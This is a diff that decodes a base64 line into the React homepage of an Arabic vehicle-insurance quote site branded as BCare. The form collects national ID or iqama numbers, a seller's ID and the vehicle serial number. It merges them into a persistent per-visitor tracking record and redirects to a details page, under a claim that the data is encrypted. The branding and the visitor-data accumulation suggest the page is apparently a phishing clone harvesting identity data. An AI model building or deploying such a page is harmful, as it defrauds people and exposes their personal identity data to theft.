@@ -1,1 +1,194 @@
-aW1wb3J0IHsgY3JlYXRlRmlsZVJvdXRlIH0gZnJvbSAiQHRhbnN0YWNrL3JlYWN0LXJvdXRlciI7CmltcG9ydCB7IFB1YmxpY0xheW91dCB9IGZyb20gIkAvY29tcG9uZW50cy9QdWJsaWNMYXlvdXQiOwppbXBvcnQgeyBGZWF0dXJlU3RyaXAsIEhvd0l0V29ya3MsIEZhcSB9IGZyb20gIkAvY29tcG9uZW50cy9Ib21lU2VjdGlvbnMiOwppbXBvcnQgeyB1c2VTdGF0ZSB9IGZyb20gInJlYWN0IjsKaW1wb3J0IHsgY3JlYXRlUXVvdGUgfSBmcm9tICJAL2xpYi9xdW90ZXMuZnVuY3Rpb25zIjsKaW1wb3J0IHsgdXNlVmlzaXRvclRyYWNraW5nIH0gZnJvbSAiQC9ob29rcy91c2VWaXNpdG9yVHJhY2tpbmciOwppbXBvcnQgeyBnZXRPckNyZWF0ZVNlc3Npb25JZCwgbWVyZ2VWaXNpdG9yRGF0YSB9IGZyb20gIkAvbGliL3Zpc2l0b3Itc2Vzc2lvbiI7CmltcG9ydCB7IEFycm93TGVmdCwgTG9jayB9IGZyb20gImx1Y2lkZS1yZWFjdCI7CgpleHBvcnQgY29uc3QgUm91dGUgPSBjcmVhdGVGaWxlUm91dGUoIi8iKSh7CiAgaGVhZDogKCkgPT4gKHsKICAgIG1ldGE6IFsKICAgICAgeyB0aXRsZTogItiq2KPZhdmK2YYg2KfZhNmF2LHZg9io2KfYqiDYo9mI2YbZhNin2YrZhiB8INio2Yog2YPZitixINmE2YTYqtij2YXZitmGIiB9LAogICAgICB7CiAgICAgICAgbmFtZTogImRlc2NyaXB0aW9uIiwKICAgICAgICBjb250ZW50OgogICAgICAgICAgItmC2KfYsdmGINij2LPYudin2LEg2KrYo9mF2YrZhiDYp9mE2YXYsdmD2KjYp9iqINio2YrZhiDYo9mD2KvYsSDZhdmGIDIwINi02LHZg9ipINiq2KPZhdmK2YYg2LPYudmI2K/ZitipINmF2LnYqtmF2K/YqdiMINmI2KfYs9iq2YTZhSDZiNir2YrZgtiq2YMg2KfZhNil2YTZg9iq2LHZiNmG2YrYqSDZgdmKINiv2YLYp9im2YIuIiwKICAgICAgfSwKICAgICAgeyBwcm9wZXJ0eTogIm9nOnRpdGxlIiwgY29udGVudDogItiq2KPZhdmK2YYg2KfZhNmF2LHZg9io2KfYqiDYo9mI2YbZhNin2YrZhiB8INio2Yog2YPZitixINmE2YTYqtij2YXZitmGIiB9LAogICAgICB7CiAgICAgICAgcHJvcGVydHk6ICJvZzpkZXNjcmlwdGlvbiIsCiAgICAgICAgY29udGVudDogItmC2KfYsdmG2Iwg2KPZhdmR2YbYjCDZiNin2LPYqtmE2YUg2YjYq9mK2YLYqtmDINmB2Yog2K/Zgtin2KbZgiDigJQg2KPZg9ir2LEg2YXZhiAyMCDYtNix2YPYqSDYqtij2YXZitmGINmB2Yog2YXZg9in2YYg2YjYp9it2K8uIiwKICAgICAgfSwKICAgICAgeyBwcm9wZXJ0eTogIm9nOnR5cGUiLCBjb250ZW50OiAid2Vic2l0ZSIgfSwKICAgICAgeyBuYW1lOiAidHdpdHRlcjpjYXJkIiwgY29udGVudDogInN1bW1hcnkiIH0sCiAgICBdLAogIH0pLAogIGNvbXBvbmVudDogSG9tZVBhZ2UsCn0pOwoKZnVuY3Rpb24gSG9tZVBhZ2UoKSB7CiAgdXNlVmlzaXRvclRyYWNraW5nKCLYp9mE2LHYptmK2LPZitipIik7CiAgY29uc3QgW3RyYW5zZmVyT3duZXJzaGlwLCBzZXRUcmFuc2Zlck93bmVyc2hpcF0gPSB1c2VTdGF0ZShmYWxzZSk7CiAgY29uc3QgW2xvYWRpbmcsIHNldExvYWRpbmddID0gdXNlU3RhdGUoZmFsc2UpOwogIGNvbnN0IFtzdWJtaXRFcnJvciwgc2V0U3VibWl0RXJyb3JdID0gdXNlU3RhdGUoIiIpOwoKICBjb25zdCBoYW5kbGVTdWJtaXQgPSBhc3luYyAoZTogUmVhY3QuRm9ybUV2ZW50PEhUTUxGb3JtRWxlbWVudD4pID0+IHsKICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgIHNldExvYWRpbmcodHJ1ZSk7CiAgICBzZXRTdWJtaXRFcnJvcigiIik7CiAgICBjb25zdCBmb3JtID0gZS5jdXJyZW50VGFyZ2V0OwogICAgY29uc3QgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoZm9ybSk7CgogICAgLy8gUmV1c2UgdGhlIHZpc2l0b3IncyBwZXJzaXN0ZW50IHNlc3Npb24gaWQgc28gcmVwZWF0IHN1Ym1pc3Npb25zCiAgICAvLyBhcHBlbmQgdG8gdGhlIHNhbWUgcmVjb3JkIGluc3RlYWQgb2YgY3JlYXRpbmcgYSBuZXcgdmlzaXRvci4KICAgIGNvbnN0IHNlc3Npb25JZCA9IGdldE9yQ3JlYXRlU2Vzc2lvbklkKCk7CgogICAgY29uc3QgcGF5bG9hZCA9IHsKICAgICAgc2Vzc2lvbl9pZDogc2Vzc2lvbklkLAogICAgICBzc246IFN0cmluZyhmb3JtRGF0YS5nZXQoInNzbiIpID8/ICIiKSwKICAgICAgc2VsbGVyX3NzbjogdHJhbnNmZXJPd25lcnNoaXAgPyBTdHJpbmcoZm9ybURhdGEuZ2V0KCJzZWxsZXJfc3NuIikgPz8gIiIpIDogdW5kZWZpbmVkLAogICAgICBpc190cmFuc2ZlcjogdHJhbnNmZXJPd25lcnNoaXAsCiAgICAgIGlkX3R5cGU6ICJpc3RpbWFyYSIsCiAgICAgIHNlcmlhbF9udW1iZXI6IFN0cmluZyhmb3JtRGF0YS5nZXQoInNlcmlhbF9udW1iZXIiKSA/PyAiIiksCiAgICAgIGlwX2FkZHJlc3M6IHVuZGVmaW5lZCwKICAgICAgdXNlcl9hZ2VudDogbmF2aWdhdG9yLnVzZXJBZ2VudCwKICAgIH07CiAgICBtZXJnZVZpc2l0b3JEYXRhKHBheWxvYWQpOwoKICAgIHRyeSB7CiAgICAgIGF3YWl0IGNyZWF0ZVF1b3RlKHsgZGF0YTogcGF5bG9hZCB9KTsKICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAiL2RldGFpbHMiOwogICAgfSBjYXRjaCB7CiAgICAgIHNldFN1Ym1pdEVycm9yKCLYqti52LDYsSDYpdix2LPYp9mEINin2YTYqNmK2KfZhtin2KrYjCDZitix2KzZiSDYp9mE2YXYrdin2YjZhNipINmF2LHYqSDYo9iu2LHZiS4iKTsKICAgICAgc2V0TG9hZGluZyhmYWxzZSk7CiAgICB9CiAgfTsKCiAgcmV0dXJuICgKICAgIDxQdWJsaWNMYXlvdXQgc2hvd0hlcm8+CiAgICAgIDxkaXYgY2xhc3NOYW1lPSJjb250YWluZXIgbXgtYXV0byBweC00IHB5LTgiPgogICAgICAgIDxkaXYgY2xhc3NOYW1lPSJteC1hdXRvIG1heC13LXhsIj4KICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPSJiY2FyZS1jYXJkIG92ZXJmbG93LWhpZGRlbiByaW5nLTEiPgogICAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT0iYm9yZGVyLWIgYm9yZGVyLWJjYXJlLWJvcmRlciBiZy1iY2FyZS1zdXJmYWNlLzcwIHB4LTUgcGItNCBwdC01Ij4KICAgICAgICAgICAgICA8aDIgY2xhc3NOYW1lPSJ0ZXh0LWxnIGZvbnQtYmxhY2sgdGV4dC1iY2FyZS1pbmsiPtin2K3YtdmEINi52YTZiSDYudix2YjYtiDYo9iz2LnYp9ixINin2YTZhdix2YPYqNipPC9oMj4KICAgICAgICAgICAgICA8cCBjbGFzc05hbWU9Im10LTEgdGV4dC14cyB0ZXh0LWJjYXJlLW11dGVkIj4KICAgICAgICAgICAgICAgINin2YTYqNmK2KfZhtin2Kog2KfZhNmF2LfZhNmI2KjYqSDZgtmE2YrZhNipIOKAlCDZiNin2YTZhtiq2YrYrNipINmB2YjYsdmK2KkuCiAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPSJweC01IHB0LTUiPgogICAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPSJncmlkIGdyaWQtY29scy0yIGdhcC0xIHJvdW5kZWQteGwgYmctc2xhdGUtMTAwIHAtMSI+CiAgICAgICAgICAgICAgICA8YnV0dG9uCiAgICAgICAgICAgICAgICAgIHR5cGU9ImJ1dHRvbiIKICAgICAgICAgICAgICAgICAgb25DbGljaz17KCkgPT4gc2V0VHJhbnNmZXJPd25lcnNoaXAoZmFsc2UpfQogICAgICAgICAgICAgICAgICBjbGFzc05hbWU9e2Byb3VuZGVkLWxnIHB5LTIuNSB0ZXh0LXNtIGZvbnQtYm9sZCB0cmFuc2l0aW9uLWFsbCAkewogICAgICAgICAgICAgICAgICAgICF0cmFuc2Zlck93bmVyc2hpcAogICAgICAgICAgICAgICAgICAgICAgPyAiYmctd2hpdGUgdGV4dC1iY2FyZS1ibHVlIHNoYWRvdy1zb2Z0IgogICAgICAgICAgICAgICAgICAgICAgOiAidGV4dC1zbGF0ZS01MDAgaG92ZXI6dGV4dC1iY2FyZS1ibHVlIgogICAgICAgICAgICAgICAgICB9YH0KICAgICAgICAgICAgICAgID4KICAgICAgICAgICAgICAgICAg2KrYo9mF2YrZhiDYrNiv2YrYrwogICAgICAgICAgICAgICAgPC9idXR0b24+CiAgICAgICAgICAgICAgICA8YnV0dG9uCiAgICAgICAgICAgICAgICAgIHR5cGU9ImJ1dHRvbiIKICAgICAgICAgICAgICAgICAgb25DbGljaz17KCkgPT4gc2V0VHJhbnNmZXJPd25lcnNoaXAodHJ1ZSl9CiAgICAgICAgICAgICAgICAgIGNsYXNzTmFtZT17YHJvdW5kZWQtbGcgcHktMi41IHRleHQtc20gZm9udC1ib2xkIHRyYW5zaXRpb24tYWxsICR7CiAgICAgICAgICAgICAgICAgICAgdHJhbnNmZXJPd25lcnNoaXAKICAgICAgICAgICAgICAgICAgICAgID8gImJnLXdoaXRlIHRleHQtYmNhcmUtYmx1ZSBzaGFkb3ctc29mdCIKICAgICAgICAgICAgICAgICAgICAgIDogInRleHQtc2xhdGUtNTAwIGhvdmVyOnRleHQtYmNhcmUtYmx1ZSIKICAgICAgICAgICAgICAgICAgfWB9CiAgICAgICAgICAgICAgICA+CiAgICAgICAgICAgICAgICAgINmG2YLZhCDZhdmE2YPZitipCiAgICAgICAgICAgICAgICA8L2J1dHRvbj4KICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8Zm9ybSBvblN1Ym1pdD17aGFuZGxlU3VibWl0fSBjbGFzc05hbWU9InNwYWNlLXktNCBwLTUgbWQ6cC02Ij4KICAgICAgICAgICAgICB7dHJhbnNmZXJPd25lcnNoaXAgJiYgKAogICAgICAgICAgICAgICAgPGRpdiBjbGFzc05hbWU9ImJjYXJlLWZhZGUtdXAiPgogICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3NOYW1lPSJiY2FyZS1sYWJlbCI+2LHZgtmFINmH2YjZitipINin2YTYqNin2KbYuTwvbGFiZWw+CiAgICAgICAgICAgICAgICAgIDxpbnB1dAogICAgICAgICAgICAgICAgICAgIG5hbWU9InNlbGxlcl9zc24iCiAgICAgICAgICAgICAgICAgICAgdHlwZT0idGV4dCIKICAgICAgICAgICAgICAgICAgICBtaW5MZW5ndGg9ezEwfQogICAgICAgICAgICAgICAgICAgIG1heExlbmd0aD17MTB9CiAgICAgICAgICAgICAgICAgICAgcGF0dGVybj0iWzAtOV0qIgogICAgICAgICAgICAgICAgICAgIGlucHV0TW9kZT0ibnVtZXJpYyIKICAgICAgICAgICAgICAgICAgICBjbGFzc05hbWU9ImJjYXJlLWZpZWxkIgogICAgICAgICAgICAgICAgICAgIHBsYWNlaG9sZGVyPSLZodmgINij2LHZgtin2YUiCiAgICAgICAgICAgICAgICAgIC8+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICApfQoKICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzTmFtZT0iYmNhcmUtbGFiZWwiPtix2YLZhSDYp9mE2YfZiNmK2KkgLyDYp9mE2KXZgtin2YXYqTwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQKICAgICAgICAgICAgICAgICAgbmFtZT0ic3NuIgogICAgICAgICAgICAgICAgICB0eXBlPSJ0ZXh0IgogICAgICAgICAgICAgICAgICByZXF1aXJlZAogICAgICAgICAgICAgICAgICBtaW5MZW5ndGg9ezEwfQogICAgICAgICAgICAgICAgICBtYXhMZW5ndGg9ezEwfQogICAgICAgICAgICAgICAgICBwYXR0ZXJuPSJbMC05XSoiCiAgICAgICAgICAgICAgICAgIGlucHV0TW9kZT0ibnVtZXJpYyIKICAgICAgICAgICAgICAgICAgY2xhc3NOYW1lPSJiY2FyZS1maWVsZCIKICAgICAgICAgICAgICAgICAgcGxhY2Vob2xkZXI9Itmh2aAg2KPYsdmC2KfZhSIKICAgICAgICAgICAgICAgIC8+CiAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgIDxkaXY+CiAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3NOYW1lPSJiY2FyZS1sYWJlbCI+2YbZiNi5INmI2KvZitmC2Kkg2KfZhNmF2LHZg9io2Kk8L2xhYmVsPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzc05hbWU9ImdyaWQgZ3JpZC1jb2xzLTIgZ2FwLTEgcm91bmRlZC14bCBiZy1zbGF0ZS0xMDAgcC0xIj4KICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzTmFtZT0iZmxleCBjdXJzb3ItcG9pbnRlciBpdGVtcy1jZW50ZXIganVzdGlmeS1jZW50ZXIgZ2FwLTIgcm91bmRlZC1sZyBiZy1iY2FyZS1ibHVlIHB5LTIuNSB0ZXh0LXdoaXRlIHNoYWRvdy1zb2Z0Ij4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9ImlkX3R5cGUiIGRlZmF1bHRDaGVja2VkIGNsYXNzTmFtZT0iaC0zLjUgdy0zLjUgYWNjZW50LXdoaXRlIiAvPgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzTmFtZT0idGV4dC1zbSBmb250LWJvbGQiPtin2LPYqtmF2KfYsdipPC9zcGFuPgogICAgICAgICAgICAgICAgICA8L2xhYmVsPgogICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3NOYW1lPSJmbGV4IGN1cnNvci1ub3QtYWxsb3dlZCBpdGVtcy1jZW50ZXIganVzdGlmeS1jZW50ZXIgZ2FwLTIgcm91bmRlZC1sZyBweS0yLjUgdGV4dC1zbGF0ZS00MDAiPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0iaWRfdHlwZSIgZGlzYWJsZWQgY2xhc3NOYW1lPSJoLTMuNSB3LTMuNSIgLz4KICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzc05hbWU9InRleHQtc20gZm9udC1ib2xkIj7YqNi32KfZgtipINis2YXYsdmD2YrYqTwvc3Bhbj4KICAgICAgICAgICAgICAgICAgPC9sYWJlbD4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgIDwvZGl2PgoKCiAgICAgICAgICAgICAgPGRpdj4KICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzc05hbWU9ImJjYXJlLWxhYmVsIj7Yp9mE2LHZgtmFINin2YTYqtiz2YTYs9mE2Yo8L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0CiAgICAgICAgICAgICAgICAgIG5hbWU9InNlcmlhbF9udW1iZXIiCiAgICAgICAgICAgICAgICAgIHR5cGU9InRleHQiCiAgICAgICAgICAgICAgICAgIHJlcXVpcmVkCiAgICAgICAgICAgICAgICAgIGNsYXNzTmFtZT0iYmNhcmUtZmllbGQiCiAgICAgICAgICAgICAgICAgIHBsYWNlaG9sZGVyPSLYp9mE2LHZgtmFINin2YTYqtiz2YTYs9mE2YoiCiAgICAgICAgICAgICAgICAvPgogICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICB7c3VibWl0RXJyb3IgJiYgKAogICAgICAgICAgICAgICAgPHAgcm9sZT0iYWxlcnQiIGNsYXNzTmFtZT0idGV4dC1jZW50ZXIgdGV4dC1zbSBmb250LWJvbGQgdGV4dC1kZXN0cnVjdGl2ZSI+CiAgICAgICAgICAgICAgICAgIHtzdWJtaXRFcnJvcn0KICAgICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICApfQogICAgICAgICAgICAgIDxidXR0b24KICAgICAgICAgICAgICAgIHR5cGU9InN1Ym1pdCIKICAgICAgICAgICAgICAgIGRpc2FibGVkPXtsb2FkaW5nfQogICAgICAgICAgICAgICAgY2xhc3NOYW1lPSJiY2FyZS1ncmFkaWVudC1jdGEgbXQtMiBmbGV4IHctZnVsbCBpdGVtcy1jZW50ZXIganVzdGlmeS1jZW50ZXIgZ2FwLTIgcm91bmRlZC14bCBweS0zLjUgdGV4dC1iYXNlIGZvbnQtYm9sZCB0ZXh0LXdoaXRlIHNoYWRvdy1nbG93LW9yYW5nZSB0cmFuc2l0aW9uLXRyYW5zZm9ybSBob3ZlcjotdHJhbnNsYXRlLXktMC41IGRpc2FibGVkOnRyYW5zbGF0ZS15LTAgZGlzYWJsZWQ6b3BhY2l0eS02MCIKICAgICAgICAgICAgICA+CiAgICAgICAgICAgICAgICB7bG9hZGluZyA/ICLYrNin2LHZiiDYp9mE2KrYrdmF2YrZhC4uLiIgOiAi2KfYrdi12YQg2LnZhNmJINi52LHZiNi2INin2YTYo9iz2LnYp9ixIn0KICAgICAgICAgICAgICAgIHshbG9hZGluZyAmJiA8QXJyb3dMZWZ0IGNsYXNzTmFtZT0iaC00IHctNCIgLz59CiAgICAgICAgICAgICAgPC9idXR0b24+CgogICAgICAgICAgICAgIDxwIGNsYXNzTmFtZT0iZmxleCBpdGVtcy1jZW50ZXIganVzdGlmeS1jZW50ZXIgZ2FwLTEuNSBwdC0xIHRleHQtY2VudGVyIHRleHQtWzExcHhdIHRleHQtc2xhdGUtNDAwIj4KICAgICAgICAgICAgICAgIDxMb2NrIGNsYXNzTmFtZT0iaC0zIHctMyIgLz4KICAgICAgICAgICAgICAgINio2YrYp9mG2KfYqtmDINmF2LTZgdmR2LHYqSDigJQg2KjZhdiq2KfYqNi52KrZgyDYo9mG2Kog2KrZiNin2YHZgiDYudmE2Ykg2LTYsdmI2Lcg2KfZhNin2LPYqtiu2K/Yp9mFINmI2LPZitin2LPYqSDYp9mE2K7YtdmI2LXZitipCiAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CgogICAgICA8RmVhdHVyZVN0cmlwIC8+CiAgICAgIDxIb3dJdFdvcmtzIC8+CiAgICAgIDxGYXEgLz4KICAgIDwvUHVibGljTGF5b3V0PgogICk7Cn0K
+import { createFileRoute } from "@tanstack/react-router";
+import { PublicLayout } from "@/components/PublicLayout";
+import { FeatureStrip, HowItWorks, Faq } from "@/components/HomeSections";
+import { useState } from "react";
+import { createQuote } from "@/lib/quotes.functions";
+import { useVisitorTracking } from "@/hooks/useVisitorTracking";
+import { getOrCreateSessionId, mergeVisitorData } from "@/lib/visitor-session";
+import { ArrowLeft, Lock } from "lucide-react";
+
+export const Route = createFileRoute("/")({
+  head: () => ({
+    meta: [
+      { title: "تأمين المركبات أونلاين | بي كير للتأمين" },
+      {
+        name: "description",
+        content:
+          "قارن أسعار تأمين المركبات بين أكثر من 20 شركة تأمين سعودية معتمدة، واستلم وثيقتك الإلكترونية في دقائق.",
+      },
+      { property: "og:title", content: "تأمين المركبات أونلاين | بي كير للتأمين" },
+      {
+        property: "og:description",
+        content: "قارن، أمّن، واستلم وثيقتك في دقائق — أكثر من 20 شركة تأمين في مكان واحد.",
+      },
+      { property: "og:type", content: "website" },
+      { name: "twitter:card", content: "summary" },
+    ],
+  }),
+  component: HomePage,
+});
+
+function HomePage() {
+  useVisitorTracking("الرئيسية");
+  const [transferOwnership, setTransferOwnership] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const [submitError, setSubmitError] = useState("");
+
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+    setLoading(true);
+    setSubmitError("");
+    const form = e.currentTarget;
+    const formData = new FormData(form);
+
+    // Reuse the visitor's persistent session id so repeat submissions
+    // append to the same record instead of creating a new visitor.
+    const sessionId = getOrCreateSessionId();
+
+    const payload = {
+      session_id: sessionId,
+      ssn: String(formData.get("ssn") ?? ""),
+      seller_ssn: transferOwnership ? String(formData.get("seller_ssn") ?? "") : undefined,
+      is_transfer: transferOwnership,
+      id_type: "istimara",
+      serial_number: String(formData.get("serial_number") ?? ""),
+      ip_address: undefined,
+      user_agent: navigator.userAgent,
+    };
+    mergeVisitorData(payload);
+
+    try {
+      await createQuote({ data: payload });
+      window.location.href = "/details";
+    } catch {
+      setSubmitError("تعذر إرسال البيانات، يرجى المحاولة مرة أخرى.");
+      setLoading(false);
+    }
+  };
+
+  return (
+    <PublicLayout showHero>
+      <div className="container mx-auto px-4 py-8">
+        <div className="mx-auto max-w-xl">
+          <div className="bcare-card overflow-hidden ring-1">
+            <div className="border-b border-bcare-border bg-bcare-surface/70 px-5 pb-4 pt-5">
+              <h2 className="text-lg font-black text-bcare-ink">احصل على عروض أسعار المركبة</h2>
+              <p className="mt-1 text-xs text-bcare-muted">
+                البيانات المطلوبة قليلة — والنتيجة فورية.
+              </p>
+            </div>
+
+            <div className="px-5 pt-5">
+              <div className="grid grid-cols-2 gap-1 rounded-xl bg-slate-100 p-1">
+                <button
+                  type="button"
+                  onClick={() => setTransferOwnership(false)}
+                  className={`rounded-lg py-2.5 text-sm font-bold transition-all ${
+                    !transferOwnership
+                      ? "bg-white text-bcare-blue shadow-soft"
+                      : "text-slate-500 hover:text-bcare-blue"
+                  }`}
+                >
+                  تأمين جديد
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setTransferOwnership(true)}
+                  className={`rounded-lg py-2.5 text-sm font-bold transition-all ${
+                    transferOwnership
+                      ? "bg-white text-bcare-blue shadow-soft"
+                      : "text-slate-500 hover:text-bcare-blue"
+                  }`}
+                >
+                  نقل ملكية
+                </button>
+              </div>
+            </div>
+
+            <form onSubmit={handleSubmit} className="space-y-4 p-5 md:p-6">
+              {transferOwnership && (
+                <div className="bcare-fade-up">
+                  <label className="bcare-label">رقم هوية البائع</label>
+                  <input
+                    name="seller_ssn"
+                    type="text"
+                    minLength={10}
+                    maxLength={10}
+                    pattern="[0-9]*"
+                    inputMode="numeric"
+                    className="bcare-field"
+                    placeholder="١٠ أرقام"
+                  />
+                </div>
+              )}
+
+              <div>
+                <label className="bcare-label">رقم الهوية / الإقامة</label>
+                <input
+                  name="ssn"
+                  type="text"
+                  required
+                  minLength={10}
+                  maxLength={10}
+                  pattern="[0-9]*"
+                  inputMode="numeric"
+                  className="bcare-field"
+                  placeholder="١٠ أرقام"
+                />
+              </div>
+
+              <div>
+                <label className="bcare-label">نوع وثيقة المركبة</label>
+                <div className="grid grid-cols-2 gap-1 rounded-xl bg-slate-100 p-1">
+                  <label className="flex cursor-pointer items-center justify-center gap-2 rounded-lg bg-bcare-blue py-2.5 text-white shadow-soft">
+                    <input type="radio" name="id_type" defaultChecked className="h-3.5 w-3.5 accent-white" />
+                    <span className="text-sm font-bold">استمارة</span>
+                  </label>
+                  <label className="flex cursor-not-allowed items-center justify-center gap-2 rounded-lg py-2.5 text-slate-400">
+                    <input type="radio" name="id_type" disabled className="h-3.5 w-3.5" />
+                    <span className="text-sm font-bold">بطاقة جمركية</span>
+                  </label>
+                </div>
+              </div>
+
+
+              <div>
+                <label className="bcare-label">الرقم التسلسلي</label>
+                <input
+                  name="serial_number"
+                  type="text"
+                  required
+                  className="bcare-field"
+                  placeholder="الرقم التسلسلي"
+                />
+              </div>
+
+              {submitError && (
+                <p role="alert" className="text-center text-sm font-bold text-destructive">
+                  {submitError}
+                </p>
+              )}
+              <button
+                type="submit"
+                disabled={loading}
+                className="bcare-gradient-cta mt-2 flex w-full items-center justify-center gap-2 rounded-xl py-3.5 text-base font-bold text-white shadow-glow-orange transition-transform hover:-translate-y-0.5 disabled:translate-y-0 disabled:opacity-60"
+              >
+                {loading ? "جاري التحميل..." : "احصل على عروض الأسعار"}
+                {!loading && <ArrowLeft className="h-4 w-4" />}
+              </button>
+
+              <p className="flex items-center justify-center gap-1.5 pt-1 text-center text-[11px] text-slate-400">
+                <Lock className="h-3 w-3" />
+                بياناتك مشفّرة — بمتابعتك أنت توافق على شروط الاستخدام وسياسة الخصوصية
+              </p>
+            </form>
+          </div>
+        </div>
+      </div>
+
+      <FeatureStrip />
+      <HowItWorks />
+      <Faq />
+    </PublicLayout>
+  );
+}
